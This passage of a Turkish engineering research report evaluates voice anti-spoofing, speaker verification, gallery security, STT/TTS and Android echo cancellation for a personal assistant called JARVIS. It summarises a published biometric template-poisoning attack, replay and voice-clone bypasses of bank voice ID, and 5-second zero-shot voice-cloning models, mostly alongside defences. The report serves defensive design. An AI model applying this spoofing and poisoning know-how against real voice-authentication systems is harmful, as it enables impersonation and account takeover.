**E) Microsoft Agent Governance Toolkit — bir spike'a değer, benimsemeye muhtemelen değmez.** Lehine: MIT, Python, ADK entegrasyonu listelenmiş, YAML/Rego/Cedar. Aleyhine: **7 bağımsız paket, DID'ler, Inter-Agent Trust Protocol, saga orkestrasyonu, SLO/error budget, plugin marketplace — tek kullanıcılık bir asistan için tamamen orantısız kurumsal yüzey**, ve Nisan 2026'da duyurulmuş genç bir proje. "OWASP agentic Top 10'un onunu birden karşılayan ilk toolkit" ve "&lt;0.1ms p99" **satıcı iddiasıdır**, doğrulanmadı.

**F) Prompt injection savunmasını sıfırdan icat etme.** Design Patterns'taki altı desenden birini **bilinçli seç ve hangisini seçtiğini yaz**. Mevcut halimiz "serbest ajan + eylem kapısı"; **Plan-Then-Execute'a geçmek (planı kullanıcı promptundan üret, çalışırken değiştirme) fabrikadan çıkan ajanlar için tek başına büyük bir kazanç olurdu.** Bu, kod yazmaktan çok bir mimari karar.

### 5.11 Doğrulama notu

Doğrudan okundu: HumanLayer `v0.7.5` Python SDK kaynağı (`models.py`, `approval.py`, `protocol.py`) — `ContactChannel` alt tipleri, `ResponseOption`, `fetch_approval`'ın `while True: sleep(3)` döngüsü, ret string formatı, `Rejected` için zorunlu comment; repo deprecation durumu; ADK `tool_confirmation.py` kaynağı + `@experimental` işareti (adk-python v2.6.2, 4 Ağu 2026); ADK `tools-custom/confirmation.md` (session service kısıtı dahil); Vercel `docs/agents/policy-tool-approvals`; `awesome-ai-agent-governance` README; Permit.io dokümanı + `permit-mcp` README; Prefactor sayfası; OWASP AOS `spec/trace/extend_ocsf/`; arXiv 2603.20953 özeti ve ölçümleri.

Doğrulanmadı: MS Agent Governance Toolkit'in ADK entegrasyonu ve performans iddiaları (satıcı blogu); Permit MCP Gateway derinliği; Prefactor'ün ürün tarafı; `awesome` listesindeki küçük araçların hiçbiri; MCP güvenlik sayısal iddiaları (Checkmarx/CSA kaynaklı).

**JARVIS kod tabanına bakılmadı** — Y3, fabrika ve renk bölgeleri hakkındaki her şey brief'e dayanıyor. **Açık kalan sorular:** ret gerekçesi zorunlu mu? Hangi session service kullanılıyor? Öneriler bunlara koşullu.

---

## 6. Ses hattı + konuşmacı kimliği

> 🔴 **Bu bölüm raporun en kritik bulgusunu içeriyor. §6.5'i atlamayın.**

### 6.1 Anti-spoofing: 2026 durumu

**Referans nokta ASVspoof 5** (IEEE TASLP, Nisan 2026): 53 takım, ~1.900 konuşmacı, kontrolsüz akustik koşullar, 11 codec varyantı, 32 saldırı tipi + iki *adversarial* saldırı ailesi (**Malafide** — CM'i kandıran konvolüsyonel filtreleme, **Malacopula** — ASV'yi hedefleyen doğrusal olmayan bozulmalar).

Sonuç tek cümlede: **SSL ön-yüzü olmayan CM ölü.**

| Sistem / koşul | minDCF | EER |
|---|---|---|
| En iyi ensemble (open, SSL ön-yüz) | 0.0158 | **%0.55** |
| SZU-AFS (open) | 0.115 | %4.04 |
| **AASIST baseline (closed, ham dalga formu)** | 0.7106 | **%29.12** |

Kazanan reçete: dondurulmuş SSL ön-yüzü (WavLM / wav2vec 2.0 / HuBERT / XLS-R) + graph-attention veya çok-ölçekli arka uç + agresif augmentation (RIR, MUSAN, frekans maskeleme) + logistic regression ile skor kalibrasyonu.

**Genelleme sorunu laboratuvar sayılarından çok daha büyük — JARVIS için en önemli tek bulgu:**

- **Deepfake-Eval-2024** (CVPRW 2026): açık kaynak SOTA detektörlerin AUC'si gerçek dünyada dolaşan deepfake'lerde **ses için %48 düşüyor**. Bazı hazır modeller 0.5 AUC'ye — **rastgele tahmine** — iniyor.
- NII Yamagishi'nin **XLS-R-2B-AntiDeepfake**'i In-the-Wild'da EER %1.23 verirken Deepfake-Eval-2024'te **%27.76**.
- 🔴 **ReplayDF** (Interspeech 2025): saldırgan deepfake'i **hoparlörden çalıp yeniden kaydettiğinde** en iyi model W2V2-AASIST'in EER'i **%4.7'den %18.2'ye** fırlıyor; RIR ile yeniden eğitim sonrası bile %11.0. **Replay, CM literatürünün kör noktası — ve JARVIS'in ev ortamındaki EN OLASI saldırısı tam olarak bu.**
- 2026'nın yeni benchmark'ları (RADAR Challenge, ML-ITW) aynı yöne bakıyor: dil ve akustik koşul çeşitliliğinde belirgin düşüş.

**Üretime konabilir açık kaynak seçenekler:**

| Model | Lisans | Boyut | Performans | Değerlendirme |
|---|---|---|---|---|
| **AASIST / AASIST-L** (`clovaai/aasist`) | **MIT** | 297K / **85K** | ASVspoof19 LA EER %0.83 / %0.99 | Cihaz-üstü koşacak kadar küçük — ama ASVspoof 5 closed'da %29 EER. **Tek başına kullanma** |
| **SSL_Anti-spoofing** (W2V2-AASIST) | **MIT** | ~317M | ASVspoof21 LA %0.82, DF %2.85 | Ön-eğitimli ağırlıklar var. Tuzak: eski `fairseq` commit'ine pinlenmiş. **Replay altında %18.2** |
| ★ **AntiDeepfake** (NII Yamagishi) | Kod BSD-3, **ağırlık CC-BY-NC-SA-4.0** | MMS-300M → XLS-R-2B | **Deepfake-Eval-2024 EER: XLS-R-1B %11.85**, MMS-300M %17.15 | **Gerçek dünyada bugün elde edilebilecek en iyi açık ağırlıklar. NC lisansı kişisel kullanım için engel değil** |
| **Nes2Net / Nes2Net-X** (IEEE TIFS) | **Doğrulanamadı** | Hafif arka uç + WavLM | CtrSVDD'de %22 iyileşme + **%87 arka uç hesap tasarrufu** | `easy_inference_demo.py` ile **entegrasyonu en kolay olanı** |
| HF'deki `*/Deepfake-audio-detection*` | Apache/MIT | wav2vec2 | Kendi beyanları | ❌ **Kullanma.** ASVspoof/FoR üzerinde aşırı öğrenmiş hobi çalışmaları |

> ⚠️ **Pratik uyarı:** `pip install` ile gelen, üretime hazır bir ses-deepfake tespit paketi **yok**. Hepsi repo klonlama + conda ortamı + Drive'dan checkpoint indirme gerektiren araştırma kodu.
> ⚠️ **SpeechBrain'de anti-spoofing recipe'i YOK** (44 recipe dizini tarandı — doğrulanmış yokluk). SpeechBrain ailesindeysek bu ekosistemin dışına çıkmak zorundayız.

### 6.2 SASV — ASV + CM füzyonu

**Sorunun büyüklüğü.** SASV Challenge 2022'nin resmî baseline'ı **çıplak ECAPA-TDNN** — yani bugün koştuğumuz şeyin ta kendisi:

| Metrik | Development | **Evaluation** |
|---|---|---|
| SV-EER (gerçek insan impostor) | %0.83 | **%1.63** |
| 🔴 **SPF-EER (sentetik / dönüştürülmüş ses)** | %20.30 | **%30.75** |
| SASV-EER (birleşik) | %17.38 | %23.83 |

> **ECAPA insan taklitçilere karşı mükemmele yakın, sentetik seslere karşı rastgele tahmine yakın. Bu, ölçtüğümüz 0.72/0.16 eşiklerinin anlamını kökten değiştiriyor: o eşikler "Kadir mi başkası mı" sorusunu iyi cevaplıyor, "Kadir mi Kadir'in KLONU mu" sorusuna HİÇ cevap vermiyor.**

**Füzyon aileleri:**
1. **Skor seviyesi** — en kolay. SASV2022 Baseline1 (score-sum) **kalibrasyonsuz olduğu için zayıf**; Baseline2 (DNN back-end) daha iyi.
2. **Çok aşamalı skor füzyonu** (arXiv 2509.12668): ECAPA + AASIST + RawGAT skorlarını logistic regression / SVM ile **ardışık iki aşamada** birleştiriyor → **SASV-EER %1.30, a-DCF 0.028** (baseline'a göre %24 göreli iyileşme). Bulgusu: **kaskad yol paralel tek aşamalı füzyondan iyi, ve kalibrasyon belirleyici.**
3. **Embedding seviyesi / ortak eğitim** — daha iyi ama yeniden eğitim gerektirir.
4. **2026'nın yönü: üç-sınıflı formülasyon + LLR** (arXiv 2603.13780, Interspeech 2026). Tek ağ, logit'lerden log-likelihood ratio türetiyor. Asıl cazibesi: **maliyet/prior parametreleri değiştiğinde yeniden eğitim gerekmiyor** — "bu eylem için eşiği sıkılaştır" ürün kararını modeli yeniden eğitmeden uygulayabiliyorsun.

**Metrik:** a-DCF (mimariden bağımsız, prior ve maliyetler açıkça tanımlı) 2026'nın standardı.

> 🎯 **JARVIS reçetesi:** ECAPA skoru ile CM skorunu **ayrı ayrı kalibre edip** (logistic regression, LLR ölçeğine) sonra birleştir. **Ham cosine ile ham CM logit'ini toplamak işe yaramaz.** En düşük efor/en yüksek kazanç: **kaskad kapı** — önce CM (bonafide değilse tur reddedilir **ve galeriye asla yazılmaz**), sonra ASV.

### 6.3 ECAPA hâlâ doğru seçim mi + Türkçe

**ECAPA artık SOTA değil, ama asıl sorunumuz bu değil.** Yine de bedava bir yükseltme masada:

| Model | Param | Vox1-O EER | Lisans |
|---|---|---|---|
| ECAPA-TDNN (mevcut) | 14.7M | %0.86–0.89 (SpeechBrain %0.80) | Apache-2.0 |
| CAM++ | 7.18M | %0.73 | 3D-Speaker / WeSpeaker |
| ERes2NetV2 | — | %0.61 (tam), %0.98 (**3 sn**), %1.48 (**2 sn**) | 3D-Speaker |
| ★ **ReDimNet2-B2** | **3.6M** | **%0.57** | **MIT**, `torch.hub` |
| ★ **ReDimNet2-B3** | 4.1M | %0.42 | MIT |
| ReDimNet2-B6 | 12.3M | %0.29 | MIT |

**ReDimNet2** (PalabraAI, 2026, MIT, `torch.hub.load("PalabraAI/redimnet2", ...)`, 16 kHz) ECAPA'nın **dörtte bir parametresiyle 1.5–2 kat daha düşük EER**. B0–B6 arası yedi bütçe. Geçiş maliyeti düşük — **ama eşikler tamamen değişir, yeniden kalibrasyon şart.**

🔴 **Kısa söz problemi bizim için kritik.** Doğrulama süreyle sert bozulur: **3.59 sn → 2.05 sn geçişinde EER %46 göreli artıyor** (8.72 → 12.8). ERes2NetV2'de aynı eğri: %0.61 (tam) → %0.98 (3 sn) → %1.48 (2 sn). **"Işıkları kapat" ~1.5 saniyedir. Yani gerçek çalışma noktamız VoxCeleb rakamlarının 2–3 katı EER'de.**

**Türkçe — aranan makale bulundu:** *Fine-Tuning ECAPA-TDNN For Turkish Speaker Verification*, IEEE Xplore **10710963** (SIU 2024). Tam metin paywall arkasında (403); özetten:
- Üç yaklaşım: (a) ön-eğitimli İngilizce ECAPA doğrudan, (b) Türkçe Common Voice ile sıfırdan, (c) İngilizce modeli Türkçe ile fine-tune
- **Sonuç: EER kriterinde ön-eğitimli İngilizce model hem sıfırdan eğitimi hem fine-tune'u YENİYOR.** Ancak **min-DCF kriterinde fine-tune en iyi** — yani "güvenlik kullanıcı rahatlığından önemliyse fine-tune"
- Gerekçe: İngilizce konuşmacı veri tabanları kat kat büyük. (Common Voice tr v26, Haz 2026: 135,6 saat, **1.829 konuşmacı**. VoxCeleb2: 6.112 konuşmacı, ~2.400 saat)
- ❌ **Sayısal EER/min-DCF değerleri özetlerde yok — bulunamadı**

> 🎯 **Türkçe tavsiyesi: ECAPA'yı Türkçe için fine-tune etmek ÖNCELİK DEĞİL** — kazanç belirsiz, veri kıt, riski (aşırı öğrenme, İngilizce ön-eğitimin genelliğini kaybetme) gerçek. **Aynı eforu AS-Norm + kalibrasyon + kısa-söz dayanıklılığına harcamak çok daha fazla kazandırır.**

### 6.4 Adaptif galeri güvenliği

🔴 **Poisoning iyi belgelenmiş, gerçek ve bizi doğrudan ilgilendiren bir saldırı.**

*Biometric Backdoors: A Poisoning Attack Against Unsupervised Template Updating* (Lovisotto & Eberz, IEEE EuroS&P 2020, arXiv 1905.09162):
- Saldırgan kendi şablonundan kurbanın şablonuna doğru **kademeli ara örnekler** üretir. Her örnek eşiği *az farkla* geçtiği için galeriye yazılır; **galeri merkezi yavaşça saldırgana kayar**
- **White-box: 10'dan az enjeksiyonla %70 başarı.** Black-box (surrogate): %15
- Sensöre erişim gerekmiyor — sadece fiziksel erişim
- ✅ **Savunma: şablon uzayında yön tutarlılığı (directional consistency) izleme.** Meşru güncellemeler rastgele yönlerde salınır; saldırı **tutarlı tek yönde** ilerler. **İki enjeksiyondan sonra %99+ tespit**, doğal değişkenlik hesaba katıldığında EER %7–14

**Somut politika seti** (ilk üçü literatürden, kalanı türetme — **hipotez**):
1. ✅ **Güncelleme kapısı CM'in arkasında olsun.** Anti-spoofing'den geçmemiş hiçbir örnek galeriye yazılmasın. **Bu tek kural sentetik ses ile poisoning'i büyük ölçüde kapatır**
2. ✅ **Yön tutarlılığı izleme** — galeri merkezinin ardışık güncelleme vektörleri arasındaki açısal tutarlılığı ölç; eşik aşılırsa güncellemeyi durdur + alarm
3. ✅ **Marj kuralı** — kabul eşiğini *az farkla* geçen örnekler yazılmasın; sadece belirgin marjla (ör. eşik + 1σ) geçenler. **Poisoning tam olarak eşiğin hemen üstünde çalışır**
4. *(hipotez)* **Drift bütçesi** — galeri merkezinin başlangıç enrollment'a göre toplam kosinüs kayması sınırlansın; bütçe dolunca insan onayı iste
5. *(hipotez)* **Kalite ağırlıklı güncelleme** — SNR, süre, embedding magnitude ile ağırlık belirle
6. ✅ **Append-only denetim kaydı + geri alınabilirlik** — her galeri sürümü saklansın, "N gün öncesine dön" mümkün olsun. **Poisoning tespit edildiğinde tek çare budur**
7. ✅ **Kanal başına ayrı alt-galeri** — telefon mikrofonu / saat mikrofonu / GSM 8 kHz karıştırılmasın

**Eşik kalibrasyonu.**
> ⚠️ **DÜZELTME (kod doğrulaması, [§8.3](#83-q3--speaker-id-eşikleri-ve-kalibrasyon)):** Araştırma brief'ine "0.72/0.16 eşikleri" diye girmiştim — **yanlış**. Gerçek eşikler `config.py`'de: `SPEAKER_ACCEPT_THRESHOLD = **0.35**`, `SPEAKER_ADAPT_THRESHOLD = **0.60**`. 0.72/0.16 **ölçülen** değerlerdi (aynı-konuşmacı eşleşmesi / impostor skoru), eşik değil. Aşağıdaki analiz eşik **değerinden bağımsız** olarak geçerli.

Eşikler tek başına yorumlanamaz. Referans: SpeechBrain `verify_batch` varsayılan eşiği **0.25**. Kodun kendi yorumu da bunu kabul ediyor: *"cosine thresholds are starting estimates, calibrated after enrollment (spec §15)"* — yani **kalibrasyon bilinçli olarak ertelenmiş bir borç, gizli bir hata değil.**

Doğru boru hattı:
1. **AS-Norm** — impostor cohort'unun benzer konuşmacılarıyla skoru normalize et. **Eşikler AS-Norm'DAN SONRA türetilmeli**
2. **QMF ile kalibrasyon** — süre, SNR, embedding magnitude, beklenen ortalama impostor skorunu logistic regression'a ver. IDLAB VoxSRC-20: süre QMF'i ile ortalama **%6 EER, %2 minDCF** iyileşme
3. **Sonra** eşik seç — el ile değil, **DET eğrisinden hedef FAR'a göre**

> 🎯 **Tek kullanıcılı sistemde impostor verisi yok — çözüm:** VoxCeleb'den (veya Common Voice tr'den) N konuşmacılık sabit bir cohort tut, Kadir'in enrollment'ına karşı skorla, impostor dağılımını böyle üret. Hedef dağılım için Kadir'in farklı oturumları. **Bu ikisi olmadan DET eğrisi yok, DET eğrisi olmadan eşik bir TAHMİNDİR.**

**Kanal dayanıklılığı (GSM için kritik):** 8 kHz dar bant vs 16 kHz uyumsuzluğu ciddi bozulma yaratır. En etkili ve basit çare: **enrollment ve test'i aynı bant genişliğine indirmek** — geniş bandı 8 kHz'e downsample etmek **%40–70 göreli iyileşme** sağlıyor (bandwidth extension sadece ~%11).
⚠️ **Android tuzağı:** `VOICE_COMMUNICATION` source'una geçince sinyale AEC + NS + AGC uygulanır. Model ham PCM üzerinde kalibre edildiyse artık aynı sinyali görmüyor (arXiv 2508.18913). **AEC'e geçersen eşikleri yeniden kalibre et.**

### 6.5 🔴 Ses kimliğini yetki kapısı yapmanın sınırları — EN KRİTİK BÖLÜM

**Standart ne diyor — NIST SP 800-63B:**

> 🔴 **GÜNCELLEME (5 Ağu 2026, NotebookLM ile birincil metinden doğrulandı):** Standardın güncel revizyonu, aşağıda özetlenenden **çok daha sert**. Birebir alıntı:
> *"Presentation Attack Detection … **Biometric comparison based on voice SHALL NOT be used.**"*
> Ve değişiklik günlüğü bunu açıkça bir yenilik olarak kaydediyor: *"Section 3.2.3.2: Requires PAD for facial recognition and **prohibits biometric comparison based on voice**"*.
> **Yani NIST'e göre ses biyometrisi "tek başına yetmez" değil, kimlik doğrulama için KULLANILMAMALIDIR.** Bu, [§6.10](#610-jarvisin-en-kritik-açigi)'daki kritik açığı zayıflatmıyor — güçlendiriyor: JARVIS'in ses kimliğini bir *yetki kapısı* olarak kullanması, yürürlükteki en yaygın kimlik doğrulama standardının açık yasağının karşısında duruyor.
> **Pratik sonuç değişmiyor ama gerekçe sertleşiyor:** ses, [§6.11 S1](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün)'deki T3 sınıfı eylemler için **asla tek faktör olmamalı**; cihaz faktörü (`BiometricPrompt` / cihaz-bağlı anahtar) zorunlu. Ses, "erken risk sinyali" ve kolaylık katmanı olarak kalır.

Standardın diğer ilgili hükümleri:
- Biyometri **yalnızca çok faktörlü doğrulamanın parçası olarak**, belirli bir *fiziksel authenticator* (sahip olduğun şey) ile birlikte kullanılabilir
- FMR **1/1000 veya daha iyi** olmalı; dağıtım testi **IAPAR < 0.07** göstermeli (ISO/IEC 30107-3 Clause 13)
- **PAD**: yüz tanıma için SHALL, iris/parmak izi için SHOULD

**Sektör ne yaptı:**
- 🔴 **Google, Voice Match ile cihaz kilidi açmayı KALDIRDI.** Gerekçe açıkça belirtildi: *"benzer bir ses veya kendi sesinizin bir kaydı"* ile cihaz hukuka aykırı biçimde açılabiliyordu. **Google kendi asistanında ses kimliğini yetki kapısı olmaktan çıkardı**, düşük riskli işler için bıraktı
- **HSBC Voice ID** bir BBC muhabirinin ikiz kardeşi tarafından yedi denemede, ayrıca AI klonuyla aşıldı. **Centrelink (Avustralya)** bir gazetecinin 4 dakikalık sesle ürettiği klonuyla aşıldı
- **Santander'in resmî pozisyonu sektörün yeni normu:** voice ID *"titiz yaklaşımımızın **bir unsuru**, talebin niteliğine göre kapsamlı kontroller dizisiyle birlikte"*
- **Nuance Gatekeeper** Microsoft altında sonlandırıldı
- **Pindrop rakamları:** voice biometrics tek başına deepfake'lerin %88'ini yakalıyor, liveness tek başına %98.3, **ikisi birlikte %96.4**
- **Contact center pratiği:** düşük riskli sorgular için pasif ses doğrulama yeterli; yüksek riskli işlemler için eşik sıkılaştırılır ve **step-up** istenir. Ortak kural: ***"ses erken bir risk sinyalidir, tek kapı değildir."***
- ✅ **Challenge-response replay'e karşı en ucuz gerçek savunma:** rastgele rakam dizisi/ifade söylet, STT ile içeriği doğrula. **Önceden kaydedilmiş bir ses bunu geçemez.** ChaRVoC (arXiv 2605.02990) bunu formalize ediyor

> 🎯 **JARVIS'e uyarlanmış sonuç:** Kadir'in telefonu zaten "sahip olduğun şey" faktörünü **bedavaya** veriyor (cihaz kilidi, `BiometricPrompt`, cihaz-bağlı anahtar). **Ses kimliği bunun YERİNE değil, ÜSTÜNE konulmalı.**
> **Ses tek başına yetkilendirebilir:** sorgu, hatırlatma, ışık/müzik kontrolü.
> **Ses tek başına YETMEMELİ:** para/ödeme, kalıcı silme, dışa mesaj gönderme, güvenlik ayarı değişikliği, **ve galeriye yeni enrollment ekleme.**

### 6.6 Ses hattı altyapısı

**LiveKit Agents** (Apache-2.0) ve **Pipecat** (BSD) — ikisi de sunucu-taraflı STT/TTS + WebRTC/WebSocket transport varsayar. **JARVIS'in cihaz-üstü STT/TTS "kalın istemci" modeli farklı bir şey.** Bu framework'lere geçmek yükseltme değil, **farklı bir ürün**. Ama **parça olarak çalınabilecek üç şey var:**

1. ★ **Semantik turn detection.** Şu an `SpeechRecognizer`'ın kendi endpointing'ine bağımlıyız — kullanıcı düşünürken kesiliyor veya gereksiz bekliyor. **Smart Turn v3: 8M param, modern CPU'da 12 ms, BSD-2, ONNX, 14 dil — Türkçe dahil.** Hem sunucuda hem cihazda koşar.
   *(LiveKit'in audio turn detector'ü de Türkçe destekli; text turn detector'ün Türkçe skoru: **%99.3 TP / %87.3 TN**, 396 MB, tur başına 50–160 ms.)*
2. ★ **Kesinti durum makinesi:** `min_duration` + `min_words` (STT açıkken gerçek kelime gerektirir) + `false_interruption_timeout` + **yanlış kesinti sonrası konuşmayı sürdürme**. Elle yazılan geçitlerde neredeyse hiç bulunmaz ve **algılanan kaliteyi en çok değiştiren şeydir**.
3. **"AEC istemcide yapılır" ilkesi.** LiveKit Swift SDK'sındaki AEC regresyonu (issue #916: *"ajan kendi çıkışını kullanıcı konuşması sanıyor"*) bunun ne kadar kırılgan olduğunun kanıtı — ve **bizim aynı hataya düştüğümüzün.**

**Sunucu-taraflı STT+TTS (GSM köprüsü gibi akıllı istemcisi olmayan kanal için):**

**Wyoming protokolü** (`OHF-Voice/wyoming`, **MIT**) beklenenden basit:
```
{"type": "...", "data": {...}, "data_length": N, "payload_length": M}\n
<N bayt data><M bayt payload>
```
TCP/Unix socket/stdio. Event aileleri: audio, wake, asr, tts, intent, handle, satellite. **`transcript-chunk` ve `synthesize-chunk`'ın varlığı önemli — protokol artık akış destekliyor.**

**HA Assist Türkçe durumu:** faster-whisper ile STT çalışır; Piper TTS **yalnızca `tr_TR-dfki-medium`**; `sentences/tr` var; **Speech-to-Phrase artık Türkçe destekli** (Kaldi + opengrm + phonetisaurus — komut için çok hızlı, serbest konuşma için değil). 🎯 **openWakeWord'de hazır `hey_jarvis` modeli var** — projeye birebir.

⚠️ **Rhasspy 3 öldü** (Mayıs 2026'da arşivlendi; Hansen: burnout + "Wyoming ve ESPHome zaten Rhasspy'nin yaptığının çoğunu yapıyor"). **Üstüne yeni iş kurma.** İlginç olan: bıraktığı boşluk — *Wyoming servisi olarak çalışan bağımsız bir pipeline runner/"beyin"* — hâlâ doldurulmadı. **JARVIS tam o deliğe oturabilir.**

**SIP / telefoni — Faz D için:**
- ★ **Asterisk + AudioSocket en basit yol.** 3 baytlık header + payload. **8 kHz, 16-bit signed linear, mono, 320 bayt = tam 20 ms frame**, tip `0x10`. Polling yok, dosya yazımı yok
- **SIM800L sesi analog verir** → harici codec gerekir; mevcut proje (`pigsm`, 7 yıldız, dokümantasyonsuz) **üretim için güvenilmez**
- ★ **SIM7600 / Quectel EC2x asıl uygulanabilir yol.** `AT+CPCMREG=1` (çağrıda PCM'i USB'ye açar), `AT+CPCMFRM=1` (**16 kHz'e çıkarır**). Sürücü: **`asterisk-chan-quectel`**
- 🔴 **Doğrulanmış üç tuzak:** (1) **Güç** — Pi USB portu 600 mA–1.2 A; modeme bağımsız besleme ver. (2) **Firmware'de ses açık mı?** — "Voice over USB/UAC" application note yoksa ses akmaz; aynı model adının bazı varyantlarında kapalı gelir. (3) **"İki yönde de ses yok"** vakaları var (chan_dongle #276) — **donanımı ALMADAN ÖNCE bu yolu doğrula**
- **Kalite gerçeği:** 8 kHz dar bant → efektif ~300–3400 Hz. 🔴 **Türkçede bu özellikle acıtır: /s/–/ş/, /f/–/v/, /ç/–/c/ ayrımları yüksek frekans enerjisindedir ve dar bantta sistematik olarak karışırlar.** (Türkçe WER'e ölçülmüş etkisi **bulunamadı** — kendi ölçümünü yap.)
- 🎯 **Değerlendirilmesi gereken alternatif: fiziksel GSM yerine SIP trunk.** G.722/Opus wideband mümkün olur; USB PCM / güç / firmware tuzaklarının hiçbiri yaşanmaz. **Yalnızca "fiziksel GSM hattı şart" kısıtı varsa modem yoluna gir.**

**Wyoming'i JARVIS konuşmalı mı?** Ev içinde (Pi ↔ STT/TTS servisleri) **evet** — MIT, bir öğleden sonrada implemente edilir. Pi ↔ Cloud Run arasında **hayır** — **Wyoming'de kimlik doğrulama/TLS yok**, yerel ağ varsayımıyla tasarlanmış.

### 6.7 Türkçe STT/TTS + klonlanabilir ses

**STT — 2026'nın haberi Whisper değil, NVIDIA:**
- ★ **`nvidia/nemotron-3.5-asr-streaming-0.6b`** (4 Haz 2026, **OpenMDW-1.1**): Cache-Aware FastConformer + RNNT, 600M, **40 dil-locale, Türkçe transcription-ready**. **FLEURS Türkçe WER: %11.17 (1.12 s chunk) – %12.34 (80 ms chunk).** **Türkçede gerçek *streaming* (cache-aware, buffered değil) veren tek açık model.** ⚠️ int4 ONNX portunda Türkçe WER **%16.69**'a çıkıyor. CPU/Pi'de çalışabilirliği **doğrulanamadı**
- ❌ **Parakeet-tdt-0.6b-v3 ve Canary-1b-v2: Türkçe YOK**
- Whisper large-v3 / turbo hâlâ en yeni ağırlıklar; 2026'da yeni temel model çıkmadı. Resmî Türkçe WER yayımlanmadı; MDPI Electronics 13(21):4227 beş Türkçe sette zero-shot **%4.3–14.2** bildiriyor
- Türkçe fine-tune'lar (**hepsi self-reported, FARKLI test setlerinde, karşılaştırılamaz**): `Sercan/distil-whisper-large-v3-tr` 14.43 · `ysdede/...turbo-tr` 15.70 · `selimc/...turkish` 18.92 · `mpoyraz/wav2vec2-xls-r-300m-cv7-turkish` 8.62 (⚠️ CTC+n-gram LM, **noktalama/büyük harf üretmez**, domain dışında kırılgan). Taze karşılaştırma: `ysdede/turkish_asr_leaderboard`
- ⚠️ **Raspberry Pi 5:** whisper.cpp small ~**0.4–0.6x gerçek zaman** → canlı mikrofon için yetersiz. **Pi'yi ses köprüsü yap, STT'yi sunucuda koştur**
- ⚠️ **Android cihaz-üstü:** whisper.cpp **Galaxy S23 + small-q4_0 ≈ 0.9x gerçek zaman**; medium/large RAM'e sığmıyor. Türkçe için small yetersiz → **S23'te cihaz-üstü serbest Türkçe dikte 2026'da hâlâ çözülmüş değil.** `SpeechRecognizer` on-device tr-TR desteği OEM'e bağlı, **garanti doğrulanamadı**
- ❌ **Boğaziçi/Yıldız/TÜBİTAK çıkışlı açık ağırlıklı Türkçe ASR modeli bulunamadı**

**TTS — klonlanabilir Türkçe, lisansa göre:**

| Model | Lisans | Türkçe | Klonlama | Not |
|---|---|---|---|---|
| ★ **Chatterbox Multilingual V3** (Resemble) | **MIT** | ✅ resmî (23 dil) | **5 sn zero-shot** | 500M, emotion exaggeration, ~5–7 GB VRAM. **Her çıktı PerTh ile filigranlı.** CPU'da 100 kelime 40+ sn → GPU şart |
| ★ **F5-TTS-Turkish** (`Karayakar/...`) | **model MIT + veri CC0** | ✅ | ✅ zero-shot | **Kod MIT + ağırlık MIT + veri CC0 = tam temiz zincir.** WER/MOS/RTF yok — kaliteyi dinleyerek doğrula |
| **XTTS-v2** | ❌ **CPML — ticari YASAK** | ✅ (17 dil) | 6 sn | En olgun ama Coqui kapandı, **ticari lisans satacak taraf da yok** |
| **Fish Audio S2/S2-Pro** | Research (NC) | ✅ | ✅ | 5B, **RTF 0.195, ~100 ms TTFA, streaming**. ⚠️ Bazı bloglar "Apache 2.0" diyor — **yanlış** |
| **Piper `tr_TR-dfki-medium`** | veri CC BY-NC-SA | ✅ tek ses | ❌ | 22.05 kHz, tek konuşmacı. `fahrettin`/`fettah` sesleri ~7 ay önce kaldırıldı. Piper artık `piper1-gpl`, **GPL-3.0** (eski repo MIT idi) |

❌ **Türkçe DESTEKLEMEYENLER (doğrulandı):** Kokoro-82M, CosyVoice 2/3, Qwen3-TTS, IndexTTS/IndexTTS-2, Spark-TTS, VibeVoice.
**Android cihaz-üstü nöral TTS:** `sherpa-onnx` + `vits-piper-tr_TR-dfki-medium` — hazır AAR, telefon CPU'sunda gerçek zamanın üstünde; `VoxSherpa TTS` sistem TTS motoru olarak kaydolabiliyor. ⚠️ **Cihaz-üstü Türkçe klonlama 2026'da gerçekçi değil.**

### 6.8 🔴 Barge-in / AEC — telefon istemcisindeki en önemli bulgu

> ⚠️ **DÜZELTME (5 Ağu 2026, kod doğrulaması — bkz. [§8.4](#84-q4--android-ses-hatti-aec)):** Bu bölüm başlangıçta *"JARVIS'te AEC hiç devrede değil"* diyordu. **Yanlıştı.** Android istemcisi mikrofonu, `SpeechRecognizer`'ı ve TTS'i zaten `VOICE_COMMUNICATION` üzerinden koşuyor (31 Tem 2026 üretim raporu sonrası eklenmiş). Aşağıdaki `VOICE_RECOGNITION` analizi **artık geçmişin açıklaması** — neden yarım-düpleks olunduğunun kaydı. **Bugün eksik olan tek halka `AudioManager.setMode(MODE_IN_COMMUNICATION)` ve AEC self-test'i.**

Android CDD 5.4, `VOICE_RECOGNITION` capture için preprocessing'i **açıkça yasaklıyor**: *"devices MUST by default, disable any noise reduction audio processing and by default, disable any automatic gain control."* AOSP dokümanı `VOICE_RECOGNITION` için NS etkinleştirmeyi **uyumluluk ihlali** sayıyor. `SpeechRecognizer` varsayılan olarak bu yolu kullanır.
> **Yani asistanın kendi TTS'ini duyması, seçilen audio source'un TANIMLI DAVRANIŞIDIR. Yarım-düpleks çözüm zorunluydu.**

| AudioSource | AEC | NS | AGC |
|---|---|---|---|
| `VOICE_COMMUNICATION` | **Evet** (Android 10+ zorunlu) | Evet | Muhtemel |
| `VOICE_RECOGNITION` | Hayır | **Yasak** | **Yasak** |
| `MIC` / `UNPROCESSED` | Garantisiz | — | — |

**Doğru zincir:**
1. `AudioRecord` → `VOICE_COMMUNICATION`, 16 kHz mono PCM16
2. `audioManager.setMode(MODE_IN_COMMUNICATION)` — **AEC zincirini uyandıran asıl anahtar**
3. TTS → `AudioAttributes` `USAGE_VOICE_COMMUNICATION`, **aynı output device'a**
4. `AcousticEchoCanceler.create(record.audioSessionId).setEnabled(true)` → **`getEnabled()` ile doğrula**

⚠️ **`isAvailable()` güvenilmez.** CDD dili "SHOULD" — deklarasyonun varlığı AEC'in *etkin* veya *kaliteli* olduğunu söylemez.
🎯 **Kesin doğrulama (Android 11+): `AudioRecord.registerAudioRecordingCallback()` → `AudioRecordingConfiguration.getEffects()`** — capture path'inde o an *fiilen aktif* efekt listesini verir. **Bunu bir "AEC self-test" telemetrisi olarak koy.**

**İki sinsi tuzak:**
- 🔴 **6 saniye kuralı:** Android 11+ üzerinde 6 saniye playback/capture olmazsa sistem `MODE_IN_COMMUNICATION`'ı **kendiliğinden sıfırlar**. LiveKit bunu sessiz bir audio track çalarak aşıyor. **JARVIS'te asistan sessizken tam bu senaryo oluşur — mod düşer, sonraki turda AEC yoktur.** *(İkincil kaynaklı, doğrulanmalı.)*
